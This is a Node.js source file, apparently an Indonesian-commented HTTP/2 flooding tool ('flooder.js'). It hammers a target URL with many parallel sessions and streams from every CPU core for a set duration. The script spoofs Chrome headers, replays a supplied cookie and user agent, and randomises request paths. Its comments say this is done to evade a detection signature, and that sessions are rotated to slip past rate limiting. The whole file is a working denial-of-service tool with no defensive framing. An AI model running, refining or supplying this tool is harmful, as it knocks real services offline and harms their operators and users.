const http2 = require('http2');
const { URL } = require('url');
const { Worker, isMainThread, workerData } = require('worker_threads');
const os = require('os');
const crypto = require('crypto');

if (isMainThread) {
    // === MAIN THREAD (PENGENDALI) ===
    const [target, duration, cookie, userAgent, method] = process.argv.slice(2);

    if (process.argv.length < 5 || isNaN(parseInt(duration))) {
        console.log('Usage: node flooder.js <URL> <DURATION> <COOKIE> <UA> <METHOD>');
        process.exit(1);
    } else {
        // TAMPILAN LOG ASLI
        console.log(`[+] SOLVE: ${target}`);
        console.log(`[+] WAKTU: ${duration}s`);
        console.log(`[+] COKIE: ${cookie}`);
        console.log(`[+] UA AGENT: ${userAgent}`);
        console.log(`[+] METODS: ${method}`);

        // Pake Semua Core biar brutal
        const threadCount = os.cpus().length;
        console.log(`[+] VMAX APEX: Aktif (${threadCount} Core - Mode 200 OK Bypass)`);

        for (let i = 0; i < threadCount; i++) {
            new Worker(__filename, {
                workerData: { target, duration, cookie, userAgent, method }
            });
        }

        setTimeout(() => {
            console.log('\n[!] Attack finished. Total 200 OK goal processed.');
            process.exit(0);
        }, duration * 1000);
    }

} else {
    // === WORKER THREAD (MESIN PENEMBAK) ===
    const { target, duration, cookie, userAgent, method } = workerData;
    const parsed = new URL(target);
    const endTime = Date.now() + (duration * 1000);

    // CIPHERS BRUTAL (Tanpa Sampah)
    const ciphers = 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';

    // KONFIGURASI SESI 45 (Sweet Spot lu)
    const PARALLEL_SESSIONS = 20; 
    const MAX_STREAMS = 100;

    function launch() {
        if (Date.now() > endTime) return;

        // VMAX Buffer Optimization (60MB)
        const session = http2.connect(parsed.origin, {
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 62914560, // 60MB: Paksa pipa luber
                maxFrameSize: 16384,
                enablePush: false
            },
            ciphers: ciphers,
            sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256'
        });

        session.on('error', () => session.destroy());

        for (let i = 0; i < MAX_STREAMS; i++) {
            if (Date.now() > endTime) break;

            // Path acak minimalis agar tidak kena Signature #17
            const randomHex = crypto.randomBytes(4).toString('hex');

            const req = session.request({
                ':method': method,
                ':path': parsed.pathname + '?' + randomHex,
                ':scheme': 'https',
                ':authority': parsed.host,
                'user-agent': userAgent,
                'cookie': cookie,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'cache-control': 'no-cache',
                'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="135"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'upgrade-insecure-requests': '1'
            }, { 
                weight: 255, 
                exclusive: true 
            });

            req.on('error', () => {});
            req.on('response', () => req.close());
            req.end();
        }

        session.on('close', () => { if (Date.now() < endTime) setImmediate(launch); });

        // Rotasi 800ms biar dapet akumulasi ratusan juta tanpa kena 429 deres
        setTimeout(() => { if (!session.destroyed) session.destroy(); }, 800);
    }

    for (let i = 0; i < PARALLEL_SESSIONS; i++) launch();
}
